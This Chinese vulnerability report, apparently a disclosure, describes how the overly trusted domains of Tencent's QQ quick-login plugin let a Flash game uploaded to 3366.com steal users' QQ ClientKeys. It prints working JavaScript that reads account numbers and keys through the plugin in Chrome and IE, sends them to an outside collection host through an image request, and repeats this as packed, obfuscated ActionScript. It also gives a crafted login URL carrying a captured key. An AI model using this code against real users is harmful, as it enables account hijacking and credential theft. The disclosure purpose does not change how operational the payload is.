

## 简要描述



这个本来是设计的问题,腾讯在设计快速登陆模块插件的时候允许太多可信域来使用这个插件来获取本机上QQ 的ClientKey ,可信域究竟多到什么程度呢?居然在可信域里面可以找到一个皇家赌场的站点...只要在插件上的可信站点找到一处XSS 即可利用,于是找到其中一处可信域上传flash 可以执行javascript 来实现ClientKey 的获取,只要flash 审核通过后还可以大规模盗取ClientKey ..



## 详细说明



出现问题的插件在Chrome 浏览器下是默认导入的:



![](pic_temp3\1.jpeg)



在IE 中,该插件又会以Active 控件导入到浏览器中:



![](pic_temp3\2.jpeg)



接下来说说插件里面的可信域,登陆插件为了防止给其它站点恶意获取用户的敏感信息所以只给下面的域来访问:



![](pic_temp3\3.png)



插件数据获取测试代码如下:



```javascript
var user_information='';

if (navigator.mimeTypes['application/nptxsso']) {  //  Chrome
    var plug=document.createElement('embed');
    plug.type='application/nptxsso';
    document.body.appendChild(plug);
    plug.InitPVA();
    for (var user_index=0,user_count=plug.GetPVACount();user_index
        user_information+='Chrome=>uin:'+plug.GetUin(user_index)+' key:'+plug.GetST(user_index)+';';
        console.log('Chrome=>uin:'+plug.GetUin(user_index)+' key:'+plug.GetST(user_index));
    }
} else {  //  IE
    var plug=new ActiveXObject('SSOAxCtrlForPTLogin.SSOForPTLogin2');
    var data=plug.CreateTXSSOData();
    plug.InitSSOFPTCtrl(0,data);
    var data_list=plug.DoOperation(1,data);
    for (var user_list=data_list.GetArray('PTALIST'),user_index=0,user_count=plug.GetPVACount();user_index
        var user=user_list.GetData(user_index);
        var client_key='';
        for (var buffer=user.GetBuf('bufST_PTLOGIN'),read_index=0,read_count=user.GetSize();read_index
            var bit='0'+buffer.GetAt(read_index).toString('16');
            client_key+=bit;
        }
        user_information+='IE=>uin:'+user.GetDWord('dwSSO_Account_dwAccountUin').toString()+' key:'+client_key+';';
        console.log('IE=>uin:'+user.GetDWord('dwSSO_Account_dwAccountUin').toString()+' key:'+client_key);
    }
}
```



在不可信的站点下执行,插件会抛出错误:



![](pic_temp3\4.jpeg)



在可信域里面执行可以获取到敏感信息:



![](pic_temp3\5.jpeg)



刚才说到,有个赌场的网站也在里面,这就给证明,站点http://ejinshang.com/ :



![](pic_temp3\6.jpeg)



然后在这些域里面找了很久没有找到XSS ,但是找到了3366.com ,里面可以自己上传flash 游戏,而且还是默认启用javascript 接口(因为flash 需要调用后面的云js 接口交互,所以支持flash 执行javascript ),于是可以结合瘦子哥的flash XSS 的原理来执行javascript 代码获取用户敏感数据( [WooYun: [腾讯实例教程\] 那些年我们一起学XSS - 15. Flash Xss进阶 [ExternalInterface.call第一个参数]](http://www.wooyun.org/bugs/wooyun-2012-016532) )



![](pic_temp3\7.png)



flash 运行javascript 的域:



![](pic_temp3\8.png)



有上面作为铺垫之后,在flash 里面写出下面的接收数据的代码

原来的javascript :



```javascript
var user_information='';

if (navigator.mimeTypes['application/nptxsso']) {  //  Chrome
    var plug=document.createElement('embed');
    plug.type='application/nptxsso';
    document.body.appendChild(plug);
    plug.InitPVA();
    for (var user_index=0,user_count=plug.GetPVACount();user_index
        user_information+='Chrome=>uin:'+plug.GetUin(user_index)+' key:'+plug.GetST(user_index)+';';
        console.log('Chrome=>uin:'+plug.GetUin(user_index)+' key:'+plug.GetST(user_index));
    }
} else {  //  IE
    var plug=new ActiveXObject('SSOAxCtrlForPTLogin.SSOForPTLogin2');
    var data=plug.CreateTXSSOData();
    plug.InitSSOFPTCtrl(0,data);
    var data_list=plug.DoOperation(1,data);
    for (var user_list=data_list.GetArray('PTALIST'),user_index=0,user_count=plug.GetPVACount();user_index
        var user=user_list.GetData(user_index);
        var client_key='';
        for (var buffer=user.GetBuf('bufST_PTLOGIN'),read_index=0,read_count=user.GetSize();read_index
            var bit='0'+buffer.GetAt(read_index).toString('16');
            client_key+=bit;
        }
        user_information+='IE=>uin:'+user.GetDWord('dwSSO_Account_dwAccountUin').toString()+' key:'+client_key+';';
        console.log('IE=>uin:'+user.GetDWord('dwSSO_Account_dwAccountUin').toString()+' key:'+client_key);
    }
}

var local_url=window.location.href;
var local_cookie=/*'Cookie:'+document.cookie+*/' ClientKey:'+user_information;
var local_ip='';//returnCitySN['cip'];
var id=1;
var url='http://easysmsattack.sinaapp.com/XSS_Get_Cookie/receive.php?current_cookie='+local_cookie+'&manage_id='+id+'&current_url='+local_url+'&current_ip='+local_ip;
var img=document.createElement('img');
img.src=url;
document.body.appendChild(img);
```



加密转换为Action Script 之后:



```javascript
ExternalInterface.call("eval","function(p,a,c,k,e,d){e=function(c){return(c35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p;}('2 9='';1h(I.H['w/t']){2 3=a.E('R');3.Q='w/t';a.A.D(3);3.U();g(2 4=0,b=3.k();4**8:'+3.v(4)+' 7:'+3.F(4)+'\\\\n';o.m('C=>8:'+3.v(4)+' 7:'+3.F(4))}}T{2 3=M L('O.G');2 f=3.P();3.N(0,f);2 r=3.S(1,f);g(2 j=r.K('J'),4=0,b=3.k();48:'+5.q('h').e()+' 7:'+d+'\\\\n';o.m('s=>8:'+5.q('h').e()+' 7:'+d)}};2 u=1d.1e.1f;2 z=' 17:'+9;2 y='';2 x=1;2 B='Z://X.V.W/10/14.15?13='+z+'&11='+x+'&12='+u+'&Y='+y;2 c=a.E('c');c.1g=B;a.A.D(c);',62,80,'||var|plug|user_index|user|read_index|key|uin|user_information|document|user_count|img|client_key|toString|data|for|dwSSO_Account_dwAccountUin|buffer|user_list|GetPVACount|read_count|log||console|bit|GetDWord|data_list|IE|nptxsso|local_url|GetUin|application|id|local_ip|local_cookie|body|url|Chrome|appendChild|createElement|GetST|SSOForPTLogin2|mimeTypes|navigator|PTALIST|GetArray|ActiveXObject|new|InitSSOFPTCtrl|SSOAxCtrlForPTLogin|CreateTXSSOData|type|embed|DoOperation|else|InitPVA|sinaapp|com|easysmsattack|current_ip|http|XSS_Get_Cookie|manage_id|current_url|current_cookie|receive|php||ClientKey|GetSize|GetAt|bufST_PTLOGIN|GetData|GetBuf|window|location|href|src|if'.split('|'),0,{});");
```



执行结果如下:



![](pic_temp3\9.png)



然后到后台可以看到记录,Link:http://1.easysmsattack.sinaapp.com/XSS_Get_Cookie/admin_cookie.php (麻烦打个码)



![](pic_temp3\10.jpeg)



如果这个flash 游戏可以经过审核(一个星期前传了个小游戏昨天才给审批,不过审核很容易的,flash 游戏代码所以百度都有很多,然后插恶意代码进去上传提交即可)的话那么玩这个小游戏的人都可以拿到他们的ClientKey (前提是快速登陆插件已经被导入到浏览器)



使用flash 执行javascript 的代码有点盲目,那么如何构造链接来让对方点击呢?呆子哥的思路很好,在此借鉴一下([WooYun: 你windows上开着QQ点了我的链接我就进了你的qq邮箱财付通等（任意腾讯xss拿qq的clientkey）](http://www.wooyun.org/bugs/wooyun-2015-0155520) ),登陆QQ 空间的URL 格式如下:https://ssl.ptlogin2.qq.com/jump?pt_clientver=5473&pt_src=1&keyindex=9&ptlang=2052&clientuin=QQ号&clientkey=ClientKey&u1=要跳转到的目的URL



以此为基础,构造出:



```txt
https://ssl.ptlogin2.qq.com/jump?pt_clientver=5473&pt_src=1&keyindex=9&ptlang=2052&clientuin=528572326&clientkey=0001570A16730068BCBAD391F63F0BF4EBB022EDA6E9C993A7D954EE027329EEF35D7DCB6C1E165F9E9B80E50D77B35AF3E367B33F1C7F4FFB2E780D62DF690EF813F4981E03699489DCD8BEF0D0F4247A050E0DEE3C272EC771838829F7D5A0C81A2A80E6C497FBD7E384F8DBF66801&u1=http%3A%2f%2fwww.3366.com%2fflash%2fpreview_detail.shtml%3Fopengameid%3D32434%26height%3D420%26width%3D580
```



注意:可能在你访问的时候无法正常加载flash ,下面有解释..



然后发给别人来访问,测试结果:



![](pic_temp3\11.jpeg)



![](pic_temp3\12.jpeg)



如果在测试中发现无法加载flash 有两个原因:



1.由于现在ClientKey 不再是以前那样一条Key 任意登陆了,只有当客户端开启的时候才可以使用ClientKey ,如果关闭了的话就无法再使用了.因为3366.com 的游戏测试flash 有限制,如果不是这个游戏的开发者没有办法在测试状态下去访问游戏的flash ,自然也就不能正常加载flash ,所以在复现漏洞的话建议写个小小的flash ,上传然后找到测试链接,再结合自己的QQ 号和ClientKey 填到登陆跳转URL 里面;



2.有些主机的浏览器里面没有装这个插件,复现的时候注意看看`navigator.mimeTypes['application/nptxsso']` 有没有存在

